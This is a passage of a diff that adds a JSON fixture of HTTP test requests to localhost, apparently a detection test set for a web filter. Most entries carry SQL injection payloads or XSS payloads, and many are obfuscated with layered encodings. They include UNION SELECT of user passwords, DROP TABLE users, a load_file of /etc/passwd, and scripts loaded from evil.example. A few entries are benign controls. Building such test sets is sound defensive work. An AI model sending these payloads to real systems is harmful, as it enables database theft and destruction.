+      ]
+    ]
+  },
+  {
+    "name": "injection variant 79 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "69"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1/**/OR/**/1=1\"}, \"tags\": [\"a\", \"1/**/OR/**/1=1\"]}"
+  },
+  {
+    "name": "injection variant 80 (query)",
+    "method": "GET",
+    "uri": "/item?id=setTimeout%2528alert%252C1%2529",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 81 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<body  onload=eval(atob('YQ=='))>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 82 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ciframe%20src%3Djavascript%26colon%3Balert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 83 (path)",
+    "method": "GET",
+    "uri": "/page/2026-10-11",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 84 (query)",
+    "method": "GET",
+    "uri": "/item?id=admin%27--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 85 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1+1 = 2"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 86 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%27%20AnD%20EXTrACTVAluE%26%2340%3B1%2CCOncAt%280X7E%2CvERSIOn%28%29%29%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 87 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "{{constructor.constructor('alert(1)')()}}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 88 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "91"
+      ]
+    ],
+    "body": "comment=1%27%20AND%20extractvalue%20%281%2Cconcat%20%280x7e%2Cversion%20%28%29%29%29--&ok=1"
+  },
+  {
+    "name": "injection variant 89 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "%3CsVG%20OnLOAD%3DALErt%281%29%3E"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 90 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1%20AND%20BENCHMARK%281000000%2CMD5%281%29%29"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 91 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "100"
+      ]
+    ],
+    "body": "comment=%26%2339%7C%26%23124%28SELECT%20%201%26%2332%3BFROM%20%20dual%26%2341%3B%26%23124%7C%27&ok=1"
+  },
+  {
+    "name": "injection variant 92 (path)",
+    "method": "GET",
+    "uri": "/page/1%20UNION%20SELECT%20username%2C%20password%20FROM%20users",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 93 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<div style=\"width:expression(alert(1))\">"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 94 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "44"
+      ]
+    ],
+    "body": "comment=a%0A%3C%0Ab%0Aand%0Ab%0A%3E%0Ac&ok=1"
+  },
+  {
+    "name": "injection variant 95 (query)",
+    "method": "GET",
+    "uri": "/item?id=dOcUMenT.wRITe%28%27%3CB%3E%27%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 96 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%20%20UNION%20%20ALL%20%20SELECT%20%20NULL%2CNULL--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 97 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "45"
+      ]
+    ],
+    "body": "comment=1%27%20OR%20%271%27%20%3D%20%271&ok=1"
+  },
+  {
+    "name": "injection variant 98 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3C%5Cx62o%5Cu0064%5Cx79%20o%5Cu006elo%5Cx61%5C144%3De%5C166al%28%5Cu0061t%5C157b%28%27YQ%3D%3D%27%29%29%5C76",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 99 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "54"
+      ]
+    ],
+    "body": "comment=%2527%253B%2520DROP%2520TABLE%2520users--&ok=1"
+  },
+  {
+    "name": "injection variant 100 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "23"
+      ]
+    ],
+    "body": "comment=2026-10-11&ok=1"
+  },
+  {
+    "name": "injection variant 101 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "41"
+      ]
+    ],
+    "body": "comment=o%5C27%20b%5C72%20IE%5C6E%20&ok=1"
+  },
+  {
+    "name": "injection variant 102 (path)",
+    "method": "GET",
+    "uri": "/page/%27%3B%20DROP%20TABLE%20users--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 103 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "65"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1' OR '1'='1\"}, \"tags\": [\"a\", \"1' OR '1'='1\"]}"
+  },
+  {
+    "name": "injection variant 104 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "43"
+      ]
+    ],
+    "body": "comment=1%2520AND%2520SLEEP%25285%2529&ok=1"
+  },
+  {
+    "name": "injection variant 105 (path)",
+    "method": "GET",
+    "uri": "/page/%3Cif%5C72%20am%5C65%20%5C20%20src%5C3d%20javas%5C63%20rip%5C74%20%3Aale%5C72%20%5C74%20%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 106 (query)",
+    "method": "GET",
+    "uri": "/item?id=DRoP%20me%20A%20lIne",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 107 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "x\\u0027 AN\\x44 1=C\\x5c\\u0034\\u0066 \\4\\x65 \\56\\u0020\\x45RT(i\\\\x36e\\x20\\134\\674 ,@@\\7\\u0036 e\\7\\x32\\40si\\u006fn)\\2d -"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 108 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "74"
+      ]
+    ],
+    "body": "comment=%3Ca%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E&ok=1"
+  },
+  {
+    "name": "injection variant 109 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1' AND extractvalue(1,concat(0x7e,version()))--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 110 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%3Bale%5C72%20%5C74%20%28String.fromC%5C68%20%5C61%20rCode%28%5C38%208%5C29%20%29%2F%2F",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 111 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "119"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"<a href=\\\"javascript:confirm(1)\\\">x</a>\"}, \"tags\": [\"a\", \"<a href=\\\"javascript:confirm(1)\\\">x</a>\"]}"
+  },
+  {
+    "name": "injection variant 112 (query)",
+    "method": "GET",
+    "uri": "/item?id=%26%2360%3B%21-%5Cu002d%5Bif%20gte%20I%5Cu0045%204%5Cu005d%3E%26%2360%3Bs%5C143r%5C151p%5Cx74%26%23%5Cx783e%3B%5Cx61l%5C145rt%281%26%2341%26%23%5Cx360%3B%2F%5Cu0073cript%26%2362%5C73%26%5Cx6c%5C164%5Cx3b%21%5Cu0026%2391%5Cu003b%5C145ndif%26%23x%5Cu0035%5Cu0064%5Cu003b%26%23%5Cu0034%5Cu0035%5Cx3b%26%23%5Cu0034%5Cx35%26%23%5Cu0036%5C62%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 113 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cdiv%20style%3D%22width%3Aexpression%28alert%281%29%29%22%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 114 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "71"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"a < b and b > c\"}, \"tags\": [\"a\", \"a < b and b > c\"]}"
+  },
+  {
+    "name": "injection variant 115 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "141"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"%27%3Balert%28String.fromCharCode%2888%29%29%2F%2F\"}, \"tags\": [\"a\", \"%27%3Balert%28String.fromCharCode%2888%29%29%2F%2F\"]}"
+  },
+  {
+    "name": "injection variant 116 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%3B%0ADROP%0ATABLE%0Ausers--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 117 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "\"><sCRIpt>FeTch('//x')</scrIPt>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 118 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "'; DROP TABLE users--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 119 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "61"
+      ]
+    ],
+    "body": "comment=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E&ok=1"
+  },
+  {
+    "name": "injection variant 120 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "46"
+      ]
+    ],
+    "body": "comment=document.write%28%27%3Cb%3E%27%29&ok=1"
+  },
+  {
+    "name": "injection variant 121 (query)",
+    "method": "GET",
+    "uri": "/item?id=x%27%20AND%201%3DCONVERT%28int%2C%40%40version%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 122 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "136"
+      ]
+    ],
+    "body": "comment=%5C3c%20s%5C63%20ript%5C20%20src%3D%5C2f%20%2Fevil%5C2e%20ex%5C61%20mp%5C6c%20%5C65%20%2Fx.js%3E%5C3c%20%2Fscrip%5C74%20%3E&ok=1"
+  },
+  {
+    "name": "injection variant 123 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3C%21--%5Bif%20gte%20IE%204%5D%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%21%5Bendif%5D--%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 124 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "13"
+      ]
+    ],
+    "body": "comment=&ok=1"
+  },
+  {
+    "name": "injection variant 125 (arg name)",
+    "method": "GET",
+    "uri": "/item?%7B%22%24ne%22%3A%20null%7D=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 126 (arg name)",
+    "method": "GET",
+    "uri": "/item?%27%3B%2F%2Ax%2A%2FDROP%2F%2Ax%2A%2FTABLE%2F%2Ax%2A%2Fusers--=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 127 (query)",
+    "method": "GET",
+    "uri": "/item?id=%5C31%20%20UNI%5C4f%20N%5C20%20SELE%5C43%20T%20user%5C6e%20ame%2C%20p%5C61%20%5C73%20%5C73%20wor%5C64%20%5C20%20%5C46%20%5C52%20%5C4f%20M%20users",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 128 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "123"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"<script src=//evil.example/x.js></script>\"}, \"tags\": [\"a\", \"<script src=//evil.example/x.js></script>\"]}"
+  },
+  {
+    "name": "injection variant 129 (arg name)",
+    "method": "GET",
+    "uri": "/item?drop%20me%20a%20line=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 130 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1e1union select"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 131 (path)",
+    "method": "GET",
+    "uri": "/page/1%2B1%3D2",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 132 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=document.write%28%27%3Cb&#37%3b3E%27&#3729"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 133 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<script>alert(1)</script>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 134 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cbody%20onload%3Deval%26%2340atob%26%2340%26%23x27%3BYQ%3D%3D%27%29%29%26%23x3e%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 135 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "35"
+      ]
+    ],
+    "body": "comment=1%20AND%20SLEEP%285%29&ok=1"
+  },
+  {
+    "name": "injection variant 136 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "231"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\\\\x78'\\\\u0020\\\\101N\\\\x44\\\\40\\\\x31\\\\u003d\\\\u0043\\\\117\\\\u004eVERT(i\\\\x6et\\\\x2c@@versio\\\\156\\\\51--\"}, \"tags\": [\"a\", \"\\\\x78'\\\\u0020\\\\101N\\\\x44\\\\40\\\\x31\\\\u003d\\\\u0043\\\\117\\\\u004eVERT(i\\\\x6et\\\\x2c@@versio\\\\156\\\\51--\"]}"
+  },
+  {
+    "name": "injection variant 137 (query)",
+    "method": "GET",
+    "uri": "/item?id=o%27brien",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 138 (query)",
+    "method": "GET",
+    "uri": "/item?id=%5Cx27%26%23x5c%3Bx20O%5Cu0052%26%2392401%5Cx3d%5Cu0031%5Cu0023",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 139 (query)",
+    "method": "GET",
+    "uri": "/item?id=1e%5C31%20un%5C69%20on%5C20%20%5C73%20el%5C65%20%5C63%20%5C74%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 140 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "35"
+      ]
+    ],
+    "body": "comment=1%20AND%20SLEEP%285%29&ok=1"
+  },
+  {
+    "name": "injection variant 141 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "74"
+      ]
+    ],
+    "body": "comment=%3CScriPt%20SRc%3D%2F%2FeViL.EXAMPle%2FX.Js%3E%3C%2FScriPt%3E&ok=1"
+  },
+  {
+    "name": "injection variant 142 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "';alert(String.fromCharCode(88))//"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 143 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cscri%5Cx70t%20src%3D%2F%2F%5Cu0065vi%5Cx6c%5Cu002eexampl%5C145%5Cx2fx.js%3E%5Cu003c%2F%5C163cr%5Cx69%5Cx70t%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 144 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%20lo%5C61%20%5C64%20_fi%5C6c%20%5C65%20%5C28%20%27%2Fetc%2Fp%5C61%20sswd%27%5C29%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 145 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 146 (path)",
+    "method": "GET",
+    "uri": "/page/%253Cscript%26%233720src%253D%252F%26%2337%3B2Fevil%26%2346example%252Fx.js%26%23x25%3B3E%26%2337%3B3C%252Fscript%253E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 147 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Cscript%20src%3D%2F%2Fevil.example%2Fx.js%3E%3C%2Fscript%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 148 (query)",
+    "method": "GET",
+    "uri": "/item?id=kit%5C61%20p",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 149 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%2B1%3D2=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 150 (query)",
+    "method": "GET",
+    "uri": "/item?id=%253C%2521--%255Bif%2520gte%2520IE%25204%255D%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%253C%2521%255Bendif%255D--%253E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 151 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "55"
+      ]
+    ],
+    "body": "comment=1%2F%2A%2A%2FOR%2F%2A%2A%2Fpg_sleep%285%29&ok=1"
+  },
+  {
+    "name": "injection variant 152 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "129"
+      ]
+    ],
